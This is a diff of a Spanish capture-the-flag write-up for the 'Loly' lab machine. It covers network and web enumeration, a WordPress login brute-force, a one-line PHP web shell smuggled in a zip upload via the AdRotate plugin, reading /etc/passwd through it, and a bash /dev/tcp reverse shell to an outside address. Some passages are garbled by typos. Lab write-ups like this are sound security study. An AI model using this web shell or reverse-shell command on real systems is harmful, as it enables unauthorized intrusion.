@@ -1,11 +1,15 @@
 # Loly
+
 Realizamos un escaneo en la red:
+
 ```bash
 > sudo arp-scan -I eth0 --localnet
 ```
+
 ![sudo arp-scan -I eth0 --localnet](arp-scan.png)
 
 ---
+
 Vemos que hay una máquina VMWare con ip 192.168.1.25. 
 Comprobamos que la máquina esté activa:
 
@@ -23,6 +27,7 @@ rtt min/avg/max/mdev = 3.076/3.076/3.076/0.000 ms
 ```
 
 ---
+
 Ahora, realizamos un escaneo simple de puertos:
 
 ```bash
@@ -44,6 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
 Inicialmente, parece haber un puerto abierto: el 80.
 
 ---
+
 Miramos que version de servidor http se está utilizando:
 
 ```basó
@@ -65,14 +71,15 @@ Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
 ```
 
 ---
-Ahora intentamos mirar qué posible sistema operativo está corriendo dicho servicio, haciendo una búsqueda em google con las siguientes palabras clave: nginx 1.10.3 Launchpad,n Gllí nos aparecerá lo más probable la ves"ión del SO sobre el qu"e corre el servicio.
 
-,Al parecer está ,corriendo sobre Ubuntu xenial.
+Ahora intentamos mirar qué posible sistema operativo está corriendo dicho servicio, haciendo una búsqueda em google con las siguientes palabras clave: nginx 1.10.3 Launchpad,n Gllí nos aparecerá lo más probable la vesión del SO sobre el que corre el servicio. 
+Al parecer está ,corriendo sobre ```Ubuntu Xenial```.
+
+![nginx_launchpadecnpng](nginx_launchpad.png)
 
 ---
-Miramos qué t:
 
-![nginx_launchpadecnpng](nginx_launchpad.png)ologías web están corriendo sobre ese servidor:
+Miramos qué tologías web están corriendo sobre ese servidor:
 
 ```bash
 > whatweb 192.168.1.25
@@ -83,12 +90,13 @@ http://192.168.1.25 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Lin
 ```
 
 ---
+
 Y ahora miramos la página principal:
 ![whatweb](2023-01-16_15-45.png)
 
 ---
-Como no hay nada, buscaremos directorios oculto
-s posibles:
+
+Como no hay nada, buscaremos directorios ocultos posibles:
 
 ```bash
 > wfuzz -c --hc 404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.25/FUZZ
@@ -102,9 +110,10 @@ s posibles:
 000045240:   200        25 L     69 W       612 Ch     "http://192.168.1.25/#"
 ```
 
-Podemos ver que hay un directorio wordpress
+Podemos ver que hay un directorio wordpress.
 
 ---
+
 Dentro del directorio wordpress miramos qué posibles subdirectorios puede haber o páginas.
 
 ```bash
@@ -119,6 +128,7 @@ Dentro del directorio wordpress miramos qué posibles subdirectorios puede haber
 000045240:   200        496 L    1474 W     28194 Ch    "http://192.168.1.25/wordpress/"
 ```						   
 --- 
+
 Al acceder al directorio wordpress desde el navegador esto es lo que vemos:
 
 ![wordpress](2023-01-16_15-49.png)
@@ -139,10 +149,13 @@ Como podemos ver los enlaces hacen referencia a un dominio en concreto, que asum
   5   │ ff02::2     ip6-allrouters
   6   │ 192.168.1.25 loly.lc
 ```
+
 Al clicar en la primera página, se abre la página principal del blog:
+
 ![](2023-01-16_15-59.png)
 
 ---
+
 Como vemos que hay una nombre que se repite continuamente, ```loly``` podemos suponer que ese nombre es un posible usuario.
 Vamos al panel de administración de wordpress que es accesible.
 
@@ -161,10 +174,11 @@ Realizamos un script llamado ```bruteForceLogin.sh``` y lo ejecutamos:
 ```
 
 ![bruteForceLogin.png](bruteForceLogin.png)
+
 ---
 
+Entramos en el panel de administración de wordpress:
 
-Entramos en el panel de administración de wordpress
 http://loly.lc/wordpress/wp-login.php
 
 y no encontramos nada especial. Miramos si hay alguna vulnerabilidad conocida para el tema de wordpress "feminine" pero no hay nada.
@@ -175,10 +189,12 @@ Enumeramos qué plugins tiene instalada la web:
 Dados los plugins y sus versiones actuales, no encontramos posibles vulnerabilidades que explotar.
 
 ---
+
 Hay un ataque con el que podemos crear una posible web-shell, e incluso crear una reverse-shell que consiste en customizar la página de error 404.php
 Este método requiere poder configurar los ficheros del tema de wordpress, pero vemos que no es posible.
 
 ![theme-file-editor.png](theme-file-editor.png)
+
 Investigando vemos que podría haber una manera de resolver esto:
 
 ![theme-file-editor-solution.png](theme-file-editor-solution.png)
@@ -186,35 +202,37 @@ Investigando vemos que podría haber una manera de resolver esto:
 Pero no funciona, porque no hay manera de encontrar las páginas donde setear esto.
 
 También podemos intentar instalar algún plugin vulnerable a php pero no podemos instalar plugins porque no tenemos privilegios para ello a pesar de ser admnistradores del sitio web de wordpress.
+
 ![cannot_install_pluggins.png](cannot_install_pluggins.png)
 
 Observando la página del plugin instalado AdRotate, vemos que podemos añadir ficheros de medios.
 Entre ellos hay posibilidad de subir ficheros .zip que, según se describe, son descomprimidos automáticamente.
 Esto nos permitiría comprimir un fichero php y subirlo camuflado dentro del fichero zip.
 
-Este es el contenido del fichero ```rec.php``` que subiremos dentro del zip:
+Este es el contenido del fichero ```rce.php``` que subiremos dentro del zip:
 
-´´´php
+```php
 <?php system($_GET['c']); ?>
-´´´
+```
 
 Tras subirlo pasamos a realizar un reconocimiento para ver si se ha subido correctamente.
+
 ![rce-php.png](rce-php.png)
 
 Ahora podríamos examinar el contenido de ficheros clave dentro del sistema de archivos de la máquina víctima. Podríamos hacer
 
-bash```
+```bash
 http://loly.lc/wordpress/wp-content/banners/rce.php?c=cat%20/etc/passwd 
 ```
 o
-bash```
+
+```bash
 http://loly.lc/wordpress/wp-content/banners/rce.php?c=ls%20-la%20/home/loly
 ``` 
 
 Sin embargo, para trabajar más cómodamente vamos a entablar una reverse shell utilizando el sigui9ente comando como parámetro en la URL:
 
 
-bash```
+```bash
 bash -c "/bin/bash -i 2&> /dev/tcp/192.196.1.80/443 <0"
 ``` 
-
